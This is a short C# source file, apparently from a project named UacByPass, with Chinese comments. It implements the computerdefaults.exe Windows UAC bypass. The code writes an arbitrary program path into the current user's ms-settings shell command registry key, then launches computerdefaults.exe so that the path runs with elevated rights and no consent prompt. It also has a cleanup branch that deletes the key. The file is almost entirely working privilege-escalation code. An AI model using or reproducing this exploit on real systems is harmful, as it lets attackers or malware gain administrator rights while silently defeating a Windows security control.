using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace UacByPass
{
    public class Methods
    {

        /// <summary>
        /// 通过 computerdefault.exe 绕过 UAC
        /// </summary>
        /// <param name="isCreate">True 为创建注册表项，False 为删除注册表项。</param>
        /// <param name="path">运行路径，path 值为 "" 时，isCreate值会固定为 False。</param>
        public static void ComputerDefaultsExe(bool isCreate, string path)
        {
            RegistryKey key;
            RegistryKey command;
            if (isCreate && path != "")
            {
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                command = key.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true);
                command.SetValue("", path);
                command.SetValue("DelegateExecute", "");
                key.Close();
                Process.Start("computerdefaults.exe");

            }
            else
            {
                key = Registry.CurrentUser;
                key.DeleteSubKeyTree(@"Software\Classes\ms-settings\", false);
            }



        }




    }
}
